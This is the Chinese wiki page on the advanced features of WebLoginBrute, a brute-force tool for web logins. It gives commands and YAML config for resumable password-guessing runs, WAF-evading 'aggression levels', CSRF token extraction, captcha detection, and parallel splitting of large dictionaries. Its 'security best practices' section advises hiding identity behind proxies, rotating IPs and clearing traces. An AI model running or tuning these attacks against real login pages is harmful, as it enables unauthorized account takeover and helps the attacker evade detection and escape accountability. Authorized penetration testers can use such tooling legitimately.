# 高级功能 (Advanced Features)

**版本：0.27.1**

本文档介绍了 WebLoginBrute 的高级功能，包括断点续扫、对抗级别、进度管理、自定义成功判定、大字典分块处理等。

## 断点续扫

WebLoginBrute 支持断点续扫功能，即使程序中断也能从上次停止的地方继续。

### 基本用法

```bash
# 启动任务
webloginbrute \
  --url "https://target.com/login" \
  --action "https://target.com/login" \
  --users "users.txt" \
  --passwords "passwords.txt" \
  --resume

# 中断后继续
webloginbrute \
  --url "https://target.com/login" \
  --action "https://target.com/login" \
  --users "users.txt" \
  --passwords "passwords.txt" \
  --resume
```

### 分块持久化

对于大规模组合数据（超过10万），系统会自动启用分块持久化：

```bash
# 系统会自动创建分块文件
# bruteforce_progress.json (主文件)
# bruteforce_progress.json.chunk_0
# bruteforce_progress.json.chunk_1
# ...

# 恢复时会自动加载所有分块
webloginbrute --config config.yaml --resume
```

## 对抗级别

WebLoginBrute 提供4个对抗级别，适应不同的目标环境。

### 级别说明

- **A0 (静默模式)**：最快速度，无延迟，适合测试环境
- **A1 (标准模式)**：平衡性能和隐蔽性，默认级别
- **A2 (激进模式)**：高对抗，较慢速度，适合有WAF的目标
- **A3 (极限模式)**：最高对抗，最慢速度，适合高安全性目标

### 使用示例

```bash
# 快速测试
webloginbrute --config config.yaml --aggression-level A0

# 标准攻击
webloginbrute --config config.yaml --aggression-level A1

# 高对抗攻击
webloginbrute --config config.yaml --aggression-level A2

# 极限攻击
webloginbrute --config config.yaml --aggression-level A3
```

## 自定义成功判定

### 自定义关键字

```python
# 在代码中自定义成功/失败关键字
success_keywords = ["dashboard", "welcome", "logout", "profile"]
failure_keywords = ["invalid", "incorrect", "failed", "error"]

# 调用时传入自定义关键字
result = self._check_login_success(
    response, 
    success_keywords=success_keywords,
    failure_keywords=failure_keywords
)
```

### 自定义正则表达式

```python
import re

def custom_success_check(response):
    # 自定义成功判定逻辑
    if response.status_code == 302:
        location = response.headers.get('Location', '')
        if '/dashboard' in location or '/admin' in location:
            return True
    return False
```

## Token 提取策略

### 多种提取方式

```bash
# 自动检测 (默认)
webloginbrute --csrf "token" --config config.yaml

# 指定 JSON 提取
webloginbrute --csrf "data.token" --config config.yaml

# 指定 HTML 提取
webloginbrute --csrf "csrf_token" --config config.yaml

# 使用正则提取
webloginbrute --csrf "token" --config config.yaml
```

### 高级 Token 配置

```yaml
# config.yaml
url: "https://target.com/login"
action: "https://target.com/login"
csrf: "token"
csrf_strategy: "regex"  # auto, json, html, regex
csrf_pattern: "name=\"token\"[^>]*value=\"([^\"]+)\""
```

## 验证码检测

### 自定义验证码关键字

```python
# 检测自定义验证码
custom_keywords = ["captcha", "验证码", "human verification", "robot check"]
if contains_captcha(html, keywords=custom_keywords):
    print("检测到验证码")
```

### 验证码处理策略

```yaml
# config.yaml
captcha_detection: true
captcha_keywords: ["captcha", "验证码", "human verification"]
captcha_action: "skip"  # skip, pause, retry
```

## 大字典分块处理

### 自动分块

```bash
# 系统会自动处理大字典
webloginbrute \
  --users "large_users.txt" \
  --passwords "large_passwords.txt" \
  --config config.yaml

# 分块处理日志
[INFO] 检测到大规模数据 (150000 个组合)，启用分块保存
[DEBUG] 数据块已保存到 'bruteforce_progress.json.chunk_0' (10000 个组合)
[DEBUG] 数据块已保存到 'bruteforce_progress.json.chunk_1' (10000 个组合)
```

### 手动分块

```bash
# 分割大字典文件
split -l 10000 passwords.txt passwords_part_

# 并行处理多个字典
for file in passwords_part_*; do
    sed -i "s|passwords:.*|passwords: \"$file\"|" config.yaml
    webloginbrute --config config.yaml --verbose &
done
```

## 日志分析自动化

### JSON 格式日志

```bash
# 启用 JSON 格式日志
python3 -c "
from webloginbrute.logger import setup_logging_json
setup_logging_json(verbose=True)
"

# 分析 JSON 日志
python3 -c "
import json
with open('logs/webloginbrute_20231201_120000.json.log') as f:
    for line in f:
        data = json.loads(line)
        if data['level'] == 'INFO' and '登录成功' in data['message']:
            print(data['message'])
"
```

### 统计报告导出

```bash
# 导出 JSON 格式报告
webloginbrute --config config.yaml
# 程序结束时会生成 final_report.json

# 分析报告
python3 -c "
import json
with open('final_report.json') as f:
    report = json.load(f)
    print(f'总尝试: {report[\"stats\"][\"total_attempts\"]}')
    print(f'成功率: {report[\"stats\"][\"successful_attempts\"]}')
    print(f'平均速率: {report[\"avg_rate\"]:.2f} 次/秒')
"
```

## 参数别名支持

### 兼容性参数

```bash
# 标准参数
webloginbrute -u https://target.com/login -a https://target.com/login

# 别名参数 (兼容其他工具)
webloginbrute --form-url https://target.com/login --submit-url https://target.com/login
webloginbrute --username-file users.txt --password-file passwords.txt
webloginbrute --csrf-field token --cookie-file cookies.txt
webloginbrute --progress-file progress.json --aggression-level A2
```

## 环境变量配置

### 安全密钥

```bash
# 设置环境变量
export WEBLOGINBRUTE_SECRET="your-secret-key-here"

# 程序会自动使用环境变量中的密钥
webloginbrute --config config.yaml
```

### 其他环境变量

```bash
# 日志级别
export WEBLOGINBRUTE_LOG_LEVEL="DEBUG"

# 最大文件大小 (MB)
export WEBLOGINBRUTE_MAX_FILE_SIZE="200"

# 最大行数
export WEBLOGINBRUTE_MAX_LINES="2000000"
```

## 性能优化

### 内存优化

```yaml
# config.yaml
max_in_memory_attempts: 5000  # 减少内存占用
chunk_size: 5000              # 分块大小
enable_session_pool: true     # 启用会话池
session_lifetime: 300         # 会话生命周期
```

### 网络优化

```yaml
# config.yaml
timeout: 30                   # 请求超时
max_retries: 3                # 最大重试次数
enable_dns_cache: true        # 启用DNS缓存
max_session_pool_size: 50     # 会话池大小
```

## 安全最佳实践

### 授权合规

```bash
# 确保获得授权
# 遵守相关法规
# 保护敏感信息

# 使用代理隐藏身份
webloginbrute --config config.yaml --proxy http://proxy:8080

# 定期更换IP
# 清理痕迹
```

### 日志安全

```bash
# 启用审计日志
# 定期清理日志文件
# 加密敏感数据

# 使用环境变量存储密钥
export WEBLOGINBRUTE_SECRET="your-secret-key"
```

---

**相关链接**: [快速开始](Getting-Started) | [配置说明](Configuration) | [对抗级别](Aggression-Levels) 